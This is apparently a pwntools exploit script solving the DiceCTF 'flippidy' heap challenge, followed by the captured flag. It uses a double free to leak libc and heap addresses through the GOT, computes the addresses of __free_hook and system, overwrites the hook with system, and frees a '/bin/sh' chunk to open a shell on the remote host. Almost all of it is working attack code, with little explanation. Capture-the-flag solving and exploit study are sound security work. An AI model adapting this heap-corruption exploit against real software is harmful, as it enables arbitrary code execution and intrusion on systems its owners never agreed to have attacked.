"""
"""
from pwn import *
import time
import ctypes

#context.update(arch="i386", os="linux", bits=32)
context.update(arch="amd64", os="linux", bits=64)


gdbscript = '''
continue
'''.format(**locals())

def start(exe, argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def add(index, content):
    io.sendafter(b":", b"1\n")
    io.sendafter(b"Index:", index + b"\n")
    io.sendafter(b"Content:", content + b"\n")

def flip():
    io.sendafter(":", "2\n")



if __name__ == "__main__":
    binary_path = "./flippidy"
    host = "dicec.tf"
    port = 31904

    heap_ptr = 0x404158
    got_free = 0x0403F88

    str_menu_ptr = 0x404020
    str_menu_0 = 0x404040
    str_menu_1 = 0x404072
    str_menu_2 = 0x4040A4
    str_menu_3 = 0x4040D6

    elf = ELF(binary_path)
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    if args.LOCAL:
        io = start(binary_path, env={"LD_PRELOAD" : "./libc.so.6"})
        #io = start(binary_path)
    else:
        io = remote(host, port)

    notebook_size = 0x5

    #pause()
    io.sendafter(b"will be:", b"3\n")

    io.sendafter(b":", b"1\n")
    io.sendafter(b"Index:", b"1\n")

    # overwrite menu pointer
    io.sendafter(b"Content:", p64(str_menu_ptr) + p64(str_menu_ptr) + b"A"*0x10 + b"\n")

    # perform double free
    flip()

    #pause()

    # write with address to leak
    io.sendafter(b":", b"1\n")
    io.sendafter(b"Index:", b"1\n")
    s  = p64(got_free) + p64(heap_ptr)
    s += p64(str_menu_2) + p64(str_menu_3)
    s += p64(str_menu_0) + p64(str_menu_0)
    s += b"\n"
    io.sendafter(b"Content:", s)

    # recieve leaked address
    r = io.recvuntil('Exit')
    lib_leak = r[3:].split(b'\n')[0]
    lib_leak = lib_leak + b'\x00'*(8 - len(lib_leak))
    free_addr = u64(lib_leak)

    heap_leak = r[3:].split(b'\n')[1]
    heap_leak = heap_leak + b'\x00'*(8 - len(heap_leak))
    heap_base = u64(heap_leak) - 0x260

    free_hook = free_addr + 0x355f98
    system_addr = free_addr - 0x48510
    malloc_hook = free_addr + 0x3542e0
    print("Free address:",hex(free_addr))
    print("System address:",hex(system_addr))
    print("Free hook:",hex(free_hook))
    print("Malloc hook:",hex(malloc_hook))
    print("Heap base:",hex(heap_base))

    #pause()

    # overwrite free hook with system by setting foward links
    io.sendafter(b":", b"1\n")
    io.sendafter(b"Index:", b"1\n")
    i = 0
    addr = free_hook
    io.sendafter(b"Content:", p64(addr) + p64(addr) + b"B"*0x10 + b"\n")

    io.sendafter(b":", b"1\n")
    io.sendafter(b"Index:", b"1\n")
    i = 0
    addr = 0x45454545
    io.sendafter(b"Content:", p64(addr) + p64(addr) + b"B"*0x10 + b"\n")

    io.sendafter(b":", b"1\n")
    io.sendafter(b"Index:", b"1\n")
    i = 0
    addr = system_addr
    io.sendafter(b"Content:", p64(addr) + p64(addr) + b"B"*0x10 + b"\n")

    io.sendafter(b":", b"1\n")
    io.sendafter(b"Index:", b"0\n")
    i = 0
    addr = system_addr
    io.sendafter(b"Content:", b"/bin/sh\x00" + b"\n")

    # perform free to call system("/bin/sh")
    flip()


    io.interactive()
    io.close()
"""
$ cat flag.txt
dice{some_dance_to_remember_some_dance_to_forget_2.27_checks_aff239e1a52cf55cd85c9c16}
"""